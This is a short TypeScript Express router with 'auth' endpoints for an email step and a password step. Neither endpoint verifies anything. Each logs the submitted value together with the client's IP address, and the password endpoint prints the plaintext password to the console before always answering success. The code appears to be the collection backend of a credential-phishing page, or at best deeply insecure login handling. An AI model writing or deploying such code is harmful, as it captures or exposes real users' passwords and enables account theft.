import { Router, Request, Response } from "express";

const router = Router();

type EmailBody = {
  email?: string;
};

type PasswordBody = {
  password?: string;
};

const getClientIp = (req: Request): string => {
  if (req.ips?.length) {
    return req.ips[0];
  }

  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) {
    const ips =
      typeof forwarded === "string" ? forwarded.split(",") : forwarded;
    return ips[0]?.trim() || "unknown";
  }

  const rawIp = req.ip || req.socket.remoteAddress || "unknown";
  if (rawIp === "::1") {
    return "127.0.0.1";
  }

  if (rawIp.startsWith("::ffff:")) {
    return rawIp.replace("::ffff:", "");
  }

  return rawIp;
};

router.post("/auth/email", (req: Request<{}, {}, EmailBody>, res: Response) => {
  const email = req.body?.email?.trim();
  const ip = getClientIp(req);

  if (!email) {
    return res.status(400).json({ ok: false, error: "Email is required." });
  }

  console.log("[EMAIL STEP]", email.toLowerCase(), "| IP:", ip);
  return res.status(200).json({ ok: true });
});

router.post(
  "/auth/password",
  (req: Request<{}, {}, PasswordBody>, res: Response) => {
    const password = req.body?.password ?? "";
    const ip = getClientIp(req);

    if (!password) {
      return res
        .status(400)
        .json({ ok: false, error: "Password is required." });
    }

    console.log("[PASSWORD STEP]", password, "| IP:", ip);
    return res.status(200).json({ ok: true });
  },
);

export default router;
